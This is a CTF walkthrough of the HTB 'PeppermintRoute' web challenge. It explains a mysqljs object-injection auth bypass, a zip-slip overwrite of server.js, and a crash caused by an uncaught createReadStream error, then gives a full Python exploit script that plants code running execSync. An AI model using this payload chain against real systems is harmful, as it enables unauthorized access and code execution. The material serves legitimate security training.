# htb university 2025 peppermintroute

![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>PeppermintRoute</font>

15<sup>th</sup> December 2025

Prepared By: `lordrukie`

Challenge Author(s): `lordrukie`

Difficulty: <font color='yellow'>Medium</font>

<br><br>

# Synopsis

Peppermint is a medium web challenges that demonstrate unseen SQL Injection in mysql due to type confusion in nodejs. Later on, player must exploit zipslip vulnerability to overwrite server files. In order to run the new server files, player must find an DOS to trigger server restart. After chaining all those exploit altogether, player will get the flag.


## Description

PeppermintRoute, Tinselwick’s sleigh-navigation portal, has started showing unexplained disruptions ever since the Starshard Bauble disappeared—route files shift, some appear incomplete, and others no longer match what the elves prepared. With the Festival of Everlight approaching, the village needs someone to dig into the portal, uncover what’s been altered, and recover the correct navigation data before preparations fall behind.

## Skills Required

- Source Code Analysis
- Typedata in Javascript
- Injection Attacks
- Linux Fundamentals
- Critical & Creative Thinking

## Skills Learned

- Type Confusion in Node.js applications leading to SQL Injection
- Exploiting ZipSlip vulnerability with custom parsers
- Deeper understanding of async error handling in JavaScript-based applications
- Chaining multiple vulnerabilities for RCE


# Enumeration

## Application Overview

We were given a web application below:

![alt text](assets/image.png)

We can only perform login wihtout any registration form

![alt text](assets/image-1.png)

## Analyzing the source code

As this are whitebox challenge, we can start by examine the application structure:

```
.
├── Dockerfile
├── app
│   ├── controllers
│   │   ├── adminController.js
│   │   ├── apiController.js
│   │   ├── authController.js
│   │   ├── fileController.js
│   │   ├── publicController.js
│   │   └── userController.js
│   ├── data
│   │   └── packages
│   │       ├── clarion.json
│   │       ├── fawn.json
│   │       ├── iridessa.json
│   │       ├── nyx.json
│   │       ├── periwinkle.json
│   │       ├── rosetta.json
│   │       ├── silvermist.json
│   │       ├── tinkerbell.json
│   │       ├── vidia.json
│   │       └── zarina.json
│   ├── init-db.js
│   ├── models
│   │   ├── Package.js
│   │   ├── Recipient.js
│   │   ├── User.js
│   │   └── mysqldb.js
│   ├── package.json
│   ├── public
│   │   ├── css
│   │   │   ├── package-detail.css
│   │   │   └── style.css
│   │   ├── images
│   │   │   ├── command-center.png
│   │   │   ├── sleigh-hangar.png
│   │   │   ├── tinselwick-portal.png
│   │   │   └── tinselwick-village.png
│   │   └── js
│   │       ├── 404.js
│   │       ├── admin-dashboard.js
│   │       ├── admin-package-detail.js
│   │       ├── admin-package-map.js
│   │       ├── admin-pilot-detail.js
│   │       ├── admin-pilots.js
│   │       ├── admin-recipient-management.js
│   │       ├── admin-recipients.js
│   │       ├── auth.js
│   │       ├── index.js
│   │       ├── login.js
│   │       ├── user-dashboard.js
│   │       ├── user-package-detail.js
│   │       ├── user-packages.js
│   │       └── utils.js
│   ├── routes
│   │   └── index.js
│   ├── server.js
│   ├── utils
│   │   └── zipParser.js
│   └── views
│       ├── 404.html
│       ├── admin
│       │   ├── dashboard.html
│       │   ├── package-detail.html
│       │   ├── pilot-detail.html
│       │   ├── pilots.html
│       │   ├── recipient-management.html
│       │   └── recipients-delete.html
│       ├── index.html
│       ├── login.html
│       └── user
│           ├── dashboard.html
│           ├── package-detail.html
│           └── packages.html
├── build.sh
├── config
│   ├── nginx.conf
│   └── supervisord.conf
├── docker-compose.yml
├── entrypoint.sh
├── flag.txt
└── readflag.c
```

### Application Setup

Let's analyze the `Dockerfile` first:

```Dockerfile
FROM node:24-bullseye

RUN apt-get update && apt-get install -y \
    nginx \
    supervisor \
    default-mysql-server \
    gcc \
    && rm -rf /var/lib/apt/lists/*

RUN useradd -m -s /bin/bash ctf

RUN mkdir -p /var/run/mysqld && \
    chown -R mysql:mysql /var/run/mysqld && \
    chown -R mysql:mysql /var/lib/mysql

RUN mkdir -p /app/data/routes /app/data/packages /app/logs
WORKDIR /app

COPY app/ /app/

RUN npm install

COPY readflag.c /tmp/readflag.c
RUN gcc /tmp/readflag.c -o /readflag && \
    chmod 4755 /readflag && \
    chown root:root /readflag && \
    chmod u+s /readflag && \
    rm /tmp/readflag.c

COPY flag.txt /root/flag.txt
RUN chmod 600 /root/flag.txt && \
    chown root:root /root/flag.txt

RUN chown -R ctf:ctf /app

COPY config/nginx.conf /etc/nginx/nginx.conf

COPY config/supervisord.conf /etc/supervisor/conf.d/supervisord.conf

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 80

CMD ["/entrypoint.sh"]

```

Looking at the Dockerfile setup, we can see that application uses supervisord as service management. Also we can see that flag are located within `/root/flag.txt`, alongside `readflag` binary with SUID set to `0`. This means that we should execute this binary to obtain flag, since our running user was `ctf` and not `root`. Based on this setup, we can clearly sure that we need to get OS Command Execution in any way to be able to read the flag.


Looking at `supervisord.conf`, We can see that application uses mysql and build on nodejs, also served with nginx.

```conf
[supervisord]
nodaemon=true
user=root
logfile=/dev/stdout
logfile_maxbytes=0
loglevel=info
pidfile=/var/run/supervisord.pid

[program:mysql]
command=/usr/bin/mysqld_safe
autostart=true
autorestart=true
user=mysql
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
redirect_stderr=true
priority=1

[program:nginx]
command=/usr/sbin/nginx -g "daemon off;"
autostart=true
autorestart=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
redirect_stderr=true
priority=3

[program:db-init]
command=/usr/local/bin/node /app/init-db.js
directory=/app
autostart=true
autorestart=false
startsecs=0
user=ctf
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
redirect_stderr=true
environment=NODE_ENV="production",DB_HOST="127.0.0.1",DB_USER="root",DB_PASSWORD="",DB_NAME="peppermintroute"
priority=2

[program:nodejs]
command=/usr/local/bin/node /app/server.js
directory=/app
autostart=true
autorestart=true
user=ctf
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
redirect_stderr=true
environment=NODE_ENV="production",DB_HOST="127.0.0.1",DB_USER="root",DB_PASSWORD="",DB_NAME="peppermintroute"
priority=3
startsecs=10

```

Looking at `init-db.js`, we can see that the application generates random credentials for all users on startup:

```javascript
const adminUsername = `admin_${crypto.randomBytes(16).toString('hex')}`;
const adminPassword = crypto.randomBytes(16).toString('hex');

await query(
    'INSERT INTO users (username, password, role, destination) VALUES (?, ?, ?, ?)',
    [adminUsername, adminPassword, 'admin', 'Tinselwick Village']
);

// Create 9 pilots with random credentials
const pilots = ['Tinkerbell', 'Silvermist', 'Fawn', 'Iridessa', 'Rosetta',
                'Vidia', 'Periwinkle', 'Clarion', 'Zarina'];

for (const pilot of pilots) {
    const pilotUsername = `${pilot.toLowerCase()}_${crypto.randomBytes(16).toString('hex')}`;
    const pilotPassword = crypto.randomBytes(16).toString('hex');

    await query(
        'INSERT INTO users (username, password, role, destination) VALUES (?, ?, ?, ?)',
        [pilotUsername, pilotPassword, 'user', `${pilot}'s Route`]
    );
}
```

This means every time the container starts, it creates random pairs of username and password.


### Route Analysis

Looking at `routes/index.js`, we can see that the application split routes for 3 different auth level as follows:

```js
// PUBLIC ROUTES
router.get('/', publicController.getIndex);
router.get('/login', authController.getLogin);
router.post('/login', authController.postLogin);
router.get('/logout', authController.logout);
router.get('/api/user', apiController.getCurrentUser);
router.get('/api/public-stats', apiController.getPublicStats);

// USER-LEVEL (Pilots)
router.get('/api/user/dashboard-data', authController.requireAuth, authController.requireUser, apiController.getUserDashboardData);
router.get('/api/user/packages-data', authController.requireAuth, authController.requireUser, apiController.getUserPackagesData);
router.get('/api/user/package/:recipient', authController.requireAuth, authController.requireUser, apiController.getPackageDetailData);
router.get('/user/dashboard', authController.requireAuth, authController.requireUser, userController.getDashboard);
router.get('/user/packages', authController.requireAuth, authController.requireUser, userController.getPackages);
router.post('/user/packages/pickup', authController.requireAuth, authController.requireUser, userController.pickupPackage);
router.get('/user/package/:recipient', authController.requireAuth, authController.requireUser, fileController.viewPackage);
router.get('/user/packages/:recipient/download', authController.requireAuth, authController.requireUser, fileController.downloadAttachment);

// ADMIN-LEVEL
router.get('/api/admin/dashboard-data', authController.requireAuth, authController.requireAdmin, apiController.getAdminDashboardData);
router.get('/api/admin/recipients-data', authController.requireAuth, authController.requireAdmin, apiController.getRecipientsData);
router.get('/api/admin/pilots-data', authController.requireAuth, authController.requireAdmin, apiController.getPilotsData);
router.get('/api/admin/pilot/:username', authController.requireAuth, authController.requireAdmin, apiController.getPilotDetailData);
router.get('/api/admin/package/:recipient', authController.requireAuth, authController.requireAdmin, apiController.getAdminPackageDetailData);
router.get('/admin/dashboard', authController.requireAuth, authController.requireAdmin, adminController.getDashboard);
router.get('/admin/recipient-management', authController.requireAuth, authController.requireAdmin, adminController.getRecipientManagement);
router.post('/admin/recipient-management/create', authController.requireAuth, authController.requireAdmin, adminController.createRecipient);
router.get('/admin/pilots', authController.requireAuth, authController.requireAdmin, adminController.getPilots);
router.get('/admin/pilots/:username', authController.requireAuth, authController.requireAdmin, adminController.getPilotDetail);
router.get('/admin/recipients/:recipient', authController.requireAuth, authController.requireAdmin, adminController.getPackageDetail);
router.post('/admin/recipients/:recipient/create-package', authController.requireAuth, authController.requireAdmin, adminController.createPackageFromForm);
router.post('/admin/recipients/:recipient/upload', authController.requireAuth, authController.requireAdmin, upload.array('files'), adminController.uploadFiles);
router.post('/admin/recipients/:recipient/assign', authController.requireAuth, authController.requireAdmin, adminController.assignPackage);
```

There's public routes, pilot routes, and admin routes. As most of the endpoint can only be accessed by authenticated users, we need to somehow gain access to progress further.


### Authentication Mechanism

Looking at `controllers/authController.js`, we can see how authentication works:

```javascript
exports.postLogin = async (req, res) => {
    const { username, password } = req.body;

    if (username && password) {
        try {
            const results = await query(
                'SELECT * FROM users WHERE username = ? AND password = ?',
                [username, password]
            );

            if (results.length > 0) {
                const user = results[0];

                req.session.userId = user.id;
                req.session.username = user.username;
                req.session.role = user.role;

                if (user.role === 'admin') {
                    return res.redirect('/admin/dashboard');
                } else {
                    return res.redirect('/user/dashboard');
                }
            } else {
                return res.status(401).json({
                    error: 'Incorrect Username and/or Password!'
                });
            }
        } catch (error) {
            console.error('Login error:', error);
            return res.status(500).json({
                error: 'Login failed. Please try again.'
            });
        }
    } else {
        return res.status(400).json({
            error: 'Please enter Username and Password!'
        });
    }
};
```

As we already know from the database initialization analysis, all credentials are randomized, so we need to find a vulnerability to bypass this authentication.

### File Upload Functionality

The file upload handler in `controllers/adminController.js` is particularly interesting:

```javascript
exports.uploadFiles = async (req, res) => {
    try {
        const { recipient } = req.params;

        if (!req.files || req.files.length === 0) {
            return res.status(400).send('No files uploaded');
        }

        const recipientExists = await Recipient.exists(recipient);
        if (!recipientExists) {
            return res.status(404).send('Recipient not found. Please create the recipient first.');
        }

        for (const file of req.files) {
            if (file.originalname.endsWith('.zip')) {
                try {
                    const zipPath = file.path;
                    const extractDir = path.dirname(zipPath);

                    const parser = new ZipParser(zipPath);
                    const extractedFiles = parser.extractAll(extractDir);

                    for (const filePath of extractedFiles) {
                        const fileName = path.basename(filePath);
                        const fileId = crypto.randomBytes(16).toString('hex');

                        await query(
                            `REPLACE INTO file_attachments (file_id, recipient, filename, filepath)
                                VALUES (?, ?, ?, ?)`,
                            [fileId, recipient, fileName, filePath]
                        );
                    }

                    fs.unlinkSync(zipPath);
                } catch (error) {
                    console.error(`Error extracting ZIP ${file.originalname}:`, error);
                }
            } else {
                await query(
                    `REPLACE INTO file_attachments (file_id, recipient, filename, filepath)
                     VALUES (?, ?, ?, ?)`,
                    [file.fileId, recipient, file.filename, file.path]
                );
            }
        }

        res.redirect(`/admin/recipients/${recipient}`);
    } catch (error) {
        console.error('Upload files error:', error);
        res.status(500).send('Error uploading files: ' + error.message);
    }
};
```

Notice that it uses a custom `ZipParser` class located in `utils/zipParser.js`. This is interesting because it have a comment:

```javascript
/*
    Created my own zip parser because I'm afraid of those supply chain attacks.
*/
```

Let's examine this custom ZIP parser more closely.

### Custom ZIP Parser Analysis

The `utils/zipParser.js` file contains a custom ZIP extraction implementation:

```javascript
extractAll(destDir) {
    const entries = this.findEntries();
    const extractedFiles = [];

    for (const entry of entries) {
        try {
            // Prevent deeply nested directory structures
            const parts = entry.fileName.split('/').filter(p => p);
            if (parts.length > 4) {
                console.error(`Path too deep: ${entry.fileName}`);
                continue;
            }

            const fullPath = path.join(destDir, entry.fileName);

            const dir = path.dirname(fullPath);
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }

            const fileData = this.buffer.slice(entry.dataOffset, entry.dataEnd);

            let content;
            if (entry.compression === 0) {
                content = fileData;
            } else if (entry.compression === 8) {
                try {
                    content = zlib.inflateRawSync(fileData);
                } catch (e) {
                    console.error(`Failed to decompress ${entry.fileName}: ${e.message}`);
                    continue;
                }
            } else {
                console.error(`Unsupported compression method ${entry.compression} for ${entry.fileName}`);
                continue;
            }

            extractedFiles.push(fullPath);
            fs.writeFileSync(fullPath, content);

        } catch (e) {
            console.error(`Error extracting ${entry.fileName}: ${e.message}`);
        }
    }

    return extractedFiles;
}
```

So basically we are not allowed to create nested directory more than 3. `test/abc/def/ghi` are work, but `test/abc/def/ghi/jkl` will result in error.

### File Download Functionality

The file download handler in `controllers/fileController.js`:

```javascript
exports.downloadAttachment = async (req, res) => {
    try {
        const { fileId } = req.query;

        if (!fileId) {
            return res.status(400).json({ error: 'fileId is required' });
        }

        const fileRecord = await Package.getFileById(fileId);

        if (!fileRecord) {
            return res.status(404).json({ error: 'File not found' });
        }

        const packageResults = await query(
            'SELECT assigned_to FROM packages WHERE recipient = ?',
            [fileRecord.recipient]
        );

        if (!packageResults || packageResults.length === 0) {
            return res.status(404).json({ error: 'Package not found' });
        }

        if (packageResults[0].assigned_to !== req.session.username) {
            return res.status(403).json({ error: 'Access denied: This file is not assigned to you' });
        }

        const filePath = fileRecord.filepath;
        const resolvedFilePath = path.resolve(filePath);
        const uploadsDir = path.resolve('/app/data/uploads');

        if (!resolvedFilePath.startsWith(uploadsDir + path.sep)) {
            return res.status(403).json({ error: 'Access denied: Invalid file location' });
        }

        res.setHeader('Content-Disposition', `attachment; filename="${fileRecord.filename}"`);
        res.setHeader('Content-Type', 'application/octet-stream');

        const fileStream = fs.createReadStream(filePath);
        fileStream.pipe(res);
    } catch (error) {
        console.error('Download error:', error);
        res.status(500).json({ error: 'Error downloading file' });
    }
};
```

A user can download attachment that have been uploaded by admin, however the download path are limited to `/app/data/uploads`, which means we can't read anything outside of that directory. Also worth noticing that server uses `fs.createReadStream` instead of `fs.readFileSync`.


# Solution

## Finding the Vulnerabilities

After spending time analyzing the source code, we discovered a fascinating chain of vulnerabilities. Let's walk through each vulnerability and how we can exploit it.

### Vulnerability #1: SQL Injection

When we first looked at the login handler in `controllers/authController.js`, it seemed secure at first glance:

```javascript
const { username, password } = req.body;

if (username && password) {
    const results = await query(
        'SELECT * FROM users WHERE username = ? AND password = ?',
        [username, password]
    );
```

Parameterized queries, right? Should be safe from SQL injection. But here's where things get interesting. It doesn't validate the *types* of the incoming data.

This vulnerability is actually documented in security research by flatt security: [Finding an Unseen SQL Injection by Bypassing Escape Functions in mysqljs/mysql](https://flatt.tech/research/posts/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql/). The research shows how Express.js's `body-parser` can create nested objects from form data.

When we send a login request like this:
```
username[username]=1&password[password]=1
```

Express.js interprets this as creating objects:
```javascript
req.body = {
    username: { username: '1' },
    password: { password: '1' }
}
```

The magic happens when the MySQL library tries to process these objects. According to the MySQL library documentation:

> "Objects are turned into `key = 'val'` pairs for each enumerable property on the object."

So when we pass an object to a parameterized query, it doesn't just convert it to a string, but it transforms it into a column comparison! Our innocent-looking query:
```sql
SELECT * FROM users WHERE username = ? AND password = ?
```

Becomes this monstrosity:
```sql
SELECT * FROM users WHERE username = `username`='1' AND password = `password`='1'
```

The ``` username = `username` ``` will result in `True`, and `True = '1'` will also result in `True`.
![alt text](assets/image-2.png)

So with that query, we esentially dumped the whole `Users` table as follows:

![alt text](assets/image-3.png)

And because the code only require result with index 0, we esentially logged in as admin.

```js
const user = results[0];
```

And just like that, we've bypassed authentication without knowing any credentials!


### Vulnerability #2: ZIP-Slip


The ZIP parser manually reads the ZIP file structure, finds file entries, and extracts them. It also have security check to prevent deeply nested directories:

```javascript
extractAll(destDir) {
    const entries = this.findEntries();
    const extractedFiles = [];

    for (const entry of entries) {
        try {
            // Prevent deeply nested directory structures
            const parts = entry.fileName.split('/').filter(p => p);
            if (parts.length > 4) {
                console.error(`Path too deep: ${entry.fileName}`);
                continue;
            }

            const fullPath = path.join(destDir, entry.fileName);
            const dir = path.dirname(fullPath);
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }

            // ... decompress and write file ...
            extractedFiles.push(fullPath);
            fs.writeFileSync(fullPath, content);
        } catch (e) {
            console.error(`Error extracting ${entry.fileName}: ${e.message}`);
        }
    }

    return extractedFiles;
}
```

Looks secure, right? They're checking the path depth! But there's a fatal flaw...

The parser only checks on *how many* path segments there are, but not with *what* those segments contain. 

So we can crate zip with entries of traversals filename such as `../../../beluga.js`. 

```javascript
const fullPath = path.join('/app/data/uploads/abc123', '../../../beluga.js');
// Result: /app/beluga.js
```

As we can only traverse 3 directory back due to the security restriction, we can only write files within `/app/` directory. Only two interesting file can be overwritten

```
/app/
├── server.js
├── package.json
```

When the ZIP is uploaded and extracted, our malicious `server.js` or `package.json` will be written to `/app/`, overwriting the original. But we have another problem. As the server is currently running, our malicious code won't execute until the server restarts. We'll need to figure out how to trigger a restart.

### Vulnerability #3: Unhandled Exception?

Let's look at the file download handler in `controllers/fileController.js`:

```javascript
exports.downloadAttachment = async (req, res) => {
    try {
        const { fileId } = req.query;

        // ... validation checks ...

        const fileRecord = await Package.getFileById(fileId);

        // ... more validation ...

        const filePath = fileRecord.filepath;
        res.setHeader('Content-Disposition', `attachment; filename="${fileRecord.filename}"`);
        res.setHeader('Content-Type', 'application/octet-stream');

        const fileStream = fs.createReadStream(filePath); 
        fileStream.pipe(res);

    } catch (error) {
        console.error('Download error:', error);
        res.status(500).json({ error: 'Error downloading file' });
    }
};
```

At first glance, this looks properly protected with try-catch. But luckily for us, it's not!.

Looking at the [Node.js Documentation](https://nodejs.org/api/fs.html#filehandlecreatereadstreamoptions), `fs.createReadStream()` was supposed to be within Callback API.

![alt text](assets/image-4.png)

What does that means? This means that the function runs **Asynchronously**.

![alt text](assets/image-5.png)

Because this function runs **asynchronously**, any errors that occur during its execution won't be caught by the surrounding **try/catch** block. Instead, such errors need to be handled through event listeners.

![alt text](assets/image-6.png)

We can observe this behavior with this minimal code:

```javascript
try {
    const stream = fs.createReadStream('/nonexistent/file');
    console.log('No error yet!'); // ← This prints!
} catch (err) {
    console.log('Caught error'); // ← This NEVER prints
}
```

![alt text](assets/image-7.png)

If it were synchronous, the error would be thrown immediately and caught by try-catch. But since it's async, the error is emitted on the stream later as an event. 

This is exactly what we need. However, in order to trigger an error in this function, we need to figure out how to create non-existent file in database. This is where the next vulnerability comes in...

### Vulnerability #4: Logic Bug in Error Handling

So we need to create a database entry for a file that doesn't exist so we can trigger the crash. Let's examine on how the ZIP extraction process handles errors.

Look at how `adminController.js` processes uploaded ZIP files:

```javascript
for (const file of req.files) {
    if (file.originalname.endsWith('.zip')) {
        try {
            const zipPath = file.path;
            const extractDir = path.dirname(zipPath);

            const parser = new ZipParser(zipPath);
            const extractedFiles = parser.extractAll(extractDir);  // Get list of files

            // Store ALL files from extractedFiles in database
            for (const filePath of extractedFiles) {
                const fileName = path.basename(filePath);
                const fileId = crypto.randomBytes(16).toString('hex');

                await query(
                    `REPLACE INTO file_attachments (file_id, recipient, filename, filepath)
                        VALUES (?, ?, ?, ?)`,
                    [fileId, recipient, fileName, filePath]
                );
            }

            fs.unlinkSync(zipPath);
        } catch (error) {
            console.error(`Error extracting ZIP ${file.originalname}:`, error);
        }
    }
}
```

The flow seems straightforward: extract files → store ALL paths in database. But what if some extractions fail partway through?

Let's look closer at the `extractAll` method:

```javascript
for (const entry of entries) {
    try {
        // ... path checks ...
        const fullPath = path.join(destDir, entry.fileName);

        // ... create directories ...

        const fileData = this.buffer.slice(entry.dataOffset, entry.dataEnd);
        let content = // ... decompress ...

        extractedFiles.push(fullPath);  // ← Added to array FIRST!
        fs.writeFileSync(fullPath, content);  // ← Then we try to write

    } catch (e) {
        console.error(`Error extracting ${entry.fileName}: ${e.message}`);
        // Error is logged but extractedFiles already contains the path!
    }
}

return extractedFiles;  // Returns ALL paths, even failed ones
```

So here the `extractedFiles.push(fullPath)` happens **before** `fs.writeFileSync()`. If the write operation fails, the error is caught and logged, but the path has already been added to the array and will be returned as a "successfully extracted" file!

After some fuzzing, we can figure out that create archive with empty directory would cause error. This happend because this line of code tries to create one directory behind the current directory and not the empty directory itself.

```js
fullPathx = path.join("/app/data/upload/somepath", "beluga/");

dirx = path.dirname(fullPathx);
console.log(dirx)
```

![alt text](assets/image-8.png)

As the upload directory exists, this emptry directory will continues till this block of code

```js
const fullPath = path.join('/app/data/uploads/somepath', 'beluga/');
// fullPath = '/app/data/uploads/somepath/beluga/'

extractedFiles.push(fullPath);  // ← Path added to array

fs.writeFileSync(fullPath, content);  // ← FAILS!
```

Why does it fail? Because `fullPath` ends with `/`, pointing to a directory, not a file. The `writeFileSync()` function cannot write to a directory path as it expects a file path!

The error is caught, logged, and ignored. However, the path `/app/data/uploads/somepath/beluga/` has already been added to `extractedFiles`, so it gets inserted into the database:

```sql
REPLACE INTO file_attachments
VALUES ('xxxxxxx...', 'xxxxxx', 'beluga/', '/app/data/uploads/somepath/beluga/')
```

We now have a database record pointing to a file that doesn't actually exist on the filesystem. This "ghost file" is the key to triggering our crash. When we attempt to download it, `fs.createReadStream()` will fail with an unhandled ENOENT error, causing the Node.js process to crash!

## Exploit

Now after we found all required vulnerabiity, we need to chain it altogether.

The flow would be like this:

![alt text](assets/flowchart.svg)

Here's the complete exploitation script:

```python
import time
import json
from requests import Session
import zipfile

URL = "http://127.0.0.1:1337"
PACKAGE_NAME = "nyx"
MALICIOUS_ZIP = "malicious.zip"

session = Session()

def create_zipslip_archive(output_filename="malicious.zip"):
    malicious_content = """
const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const path = require('path');
const crypto = require('crypto');
const routes = require('./routes');
const child_process = require('child_process');

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

console.log(child_process.execSync('/readflag > /app/public/js/flag.txt').toString());

app.use(session({
    secret: crypto.randomBytes(32).toString('hex'),
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000
    }
}));

app.use('/', routes);

app.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'views/404.html'));
});

app.listen(PORT, '127.0.0.1', () => {
    console.log(`[Server] PeppermintRoute running on http://127.0.0.1:${PORT}`);
});
"""

    malicious_filename = "../../../server.js"

    with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr("directory/", b"this is directory")
        zipf.writestr(malicious_filename, malicious_content)

def login(username: str = "") -> bool:
    if not username:
        data = {
            "username[username]": "1",
            "password[password]": "1"
        }
    else:
        data = {
            "username": username,
            "password[password]": "1"
        }

    resp = session.post(f"{URL}/login", data=data)
    if "Incorrect Username and/or Password!" in resp.text:
        return False
    return True

def upload_package(filename: str = MALICIOUS_ZIP) -> str:
    create_zipslip_archive()
    with open(filename, "rb") as f:
        upload_resp = session.post(
            f"{URL}/admin/recipients/{PACKAGE_NAME}/upload",
            files={"files": f}
        )

    details_resp = session.get(f"{URL}/api/admin/package/{PACKAGE_NAME}")
    files = details_resp.json().get("files", [])

    for file in files:
        if file.get("filename") == "directory":
            return file["file_id"]
    return ""

def assign_pilot(username: str):
    resp = session.post(
        f"{URL}/admin/recipients/{PACKAGE_NAME}/assign",
        data={"username": username}
    )
    return resp.status_code == 200

def get_first_pilot_username() -> str:
    resp = session.get(f"{URL}/api/admin/pilots-data")
    pilots = resp.json().get("pilots", [])
    return pilots[0].get("username", "") if pilots else ""

def trigger_reset(file_id: str):
    try:
        resp = session.get(
            f"{URL}/user/packages/{PACKAGE_NAME}/download?fileId={file_id}",
            timeout=2
        )
        return resp
    except Exception as e:
        return None

def get_flag() -> str:
    resp = session.get(f"{URL}/js/flag.txt}")
    return resp.text if resp.status_code == 200 else ""

def main():
    # 1. Login as admin
    if not login():
        return

    # 2. Upload malicious ZIP
    file_id = upload_package(MALICIOUS_ZIP)
    if not file_id:
        return

    # 3. Get pilot username and assign package
    username = get_first_pilot_username()
    if not username or not assign_pilot(username):
        return

    # 4. Login as pilot
    if not login(username):
        return

    # 5. Trigger crash by downloading non-existent file
    trigger_reset(file_id)

    # 6. Wait for restart
    time.sleep(4)

    # 7. Get flag
    flag = get_flag()
    if flag:
        print(f"\n[FLAG] {flag}")

if __name__ == "__main__":
    main()
```

After running this exploit script, we will get the flag!

![alt text](assets/image-9.png)